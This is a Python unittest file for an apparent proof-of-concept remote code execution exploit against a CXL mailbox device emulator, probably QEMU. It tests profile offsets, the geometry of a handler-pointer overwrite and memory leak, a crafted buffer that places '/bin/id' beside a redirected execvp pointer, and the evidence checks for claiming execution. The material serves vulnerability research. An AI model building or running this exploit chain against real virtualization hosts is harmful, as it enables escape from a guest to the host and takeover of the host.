import importlib.util
import json
from pathlib import Path
import sys
import tempfile
import unittest


POC_PATH = Path(__file__).resolve().parents[1] / "poc" / "cxl_mailbox_rce.py"
SPEC = importlib.util.spec_from_file_location("cxl_mailbox_rce", POC_PATH)
POC = importlib.util.module_from_spec(SPEC)
assert SPEC.loader is not None
sys.modules[SPEC.name] = POC
SPEC.loader.exec_module(POC)


class ProfileTests(unittest.TestCase):
    def test_profile_accepts_hex_offsets(self):
        profile = POC.ExploitProfile.from_mapping({
            "payload_to_primary_cci": 2600,
            "known_handler_offset": "0x4d2c70",
            "target_symbol_offset": "0x347150",
            "cxl_cmd_size": 32,
            "handler_field_offset": 8,
        })
        self.assertEqual(profile.payload_to_primary_cci, 2600)
        self.assertEqual(profile.known_handler_offset, 0x4D2C70)
        self.assertEqual(profile.target_symbol_offset, 0x347150)

    def test_profile_accepts_runner_layout_key_names(self):
        profile = POC.ExploitProfile.from_mapping({
            "payload_to_primary_cci": 2600,
            "known_handler_offset": "0x4d2c70",
            "target_symbol_offset": "0x347150",
            "command_entry_bytes": 32,
            "selected_command": 5,
        })
        self.assertEqual(profile.cxl_cmd_size, 32)
        self.assertEqual(profile.selected_command, 5)

    def test_profile_uses_measured_nested_handler_layout(self):
        profile = POC.ExploitProfile.from_mapping({
            "payload_to_primary_cci": 2600,
            "known_handler_offset": "0x4d2c70",
            "target_symbol_offset": "0x347150",
            "layout": {
                "command_entry_bytes": 32,
                "handler_field_offset": 8,
            },
        })
        self.assertEqual(profile.cxl_cmd_size, 32)
        self.assertEqual(profile.handler_field_offset, 8)

    def test_load_profile_applies_explicit_override(self):
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory) / "profile.json"
            path.write_text(json.dumps({
                "payload_to_primary_cci": 2600,
                "known_handler_offset": "0x1000",
                "target_symbol_offset": "0x2000",
            }))
            profile = POC.load_profile(path, {"target_symbol_offset": 0x3000})
        self.assertEqual(profile.target_symbol_offset, 0x3000)

    def test_profile_rejects_wrong_execution_target(self):
        with self.assertRaisesRegex(ValueError, "execvp@plt"):
            POC.ExploitProfile.from_mapping({
                "payload_to_primary_cci": 2600,
                "known_handler_offset": "0x1000",
                "target_symbol_offset": "0x2000",
                "target_symbol": "system@plt",
            })

    def test_profile_rejects_layout_inside_payload(self):
        with self.assertRaisesRegex(ValueError, "beyond the mailbox payload"):
            POC.ExploitProfile.from_mapping({
                "payload_to_primary_cci": 2048,
                "known_handler_offset": "0x1000",
                "target_symbol_offset": "0x2000",
            })


class GeometryTests(unittest.TestCase):
    def setUp(self):
        self.profile = POC.ExploitProfile.from_mapping({
            "payload_to_primary_cci": 2600,
            "known_handler_offset": "0x4d2c70",
            "target_symbol_offset": "0x347150",
            "cxl_cmd_size": 32,
            "handler_field_offset": 8,
        })

    def test_geometry_matches_measured_optimized_layout(self):
        geometry = POC.chain_geometry(self.profile)
        self.assertEqual(geometry["selected_handler_payload_offset"], 2768)
        self.assertEqual(geometry["selected_handler_lsa_offset"], 2760)
        self.assertEqual(geometry["retrieve_offset"], 2736)
        self.assertEqual(geometry["overwrite_length"], 2616)
        self.assertEqual(geometry["minimum_leak_length"], 2776)

    def test_authored_entry_contains_only_fixed_path_and_runtime_target(self):
        target = 0x555500347150
        authored = POC.build_authored_lsa(self.profile, target)
        geometry = POC.chain_geometry(self.profile)
        command = geometry["first_cmd_lsa_offset"]
        handler = geometry["first_handler_lsa_offset"]
        self.assertEqual(authored[command:handler], b"/bin/id\x00")
        self.assertEqual(
            int.from_bytes(authored[handler:handler + 8], "little"), target
        )
        self.assertEqual(authored[:8], b"\x00" * 8)


class EvidenceTests(unittest.TestCase):
    def test_all_signals_are_required_for_execution_claim(self):
        complete = {name: True for name in POC.PROOF_SIGNALS}
        self.assertTrue(POC.proof_is_complete(complete))
        for missing in POC.PROOF_SIGNALS:
            candidate = dict(complete)
            candidate[missing] = False
            with self.subTest(missing=missing):
                self.assertFalse(POC.proof_is_complete(candidate))

    def test_mtree_parser_deduplicates_same_region(self):
        text = """
00000000fe810088-00000000fe8108a7 (prio 0, i/o): mailbox
  00000000fe810088-00000000fe8108a7 (prio 0, i/o): mailbox
"""
        regions = POC.parse_mtree_mailboxes(text)
        self.assertEqual(len(regions), 1)
        self.assertEqual(regions[0]["base"], 0xFE810088)
        self.assertEqual(regions[0]["size"], 2080)


if __name__ == "__main__":
    unittest.main()
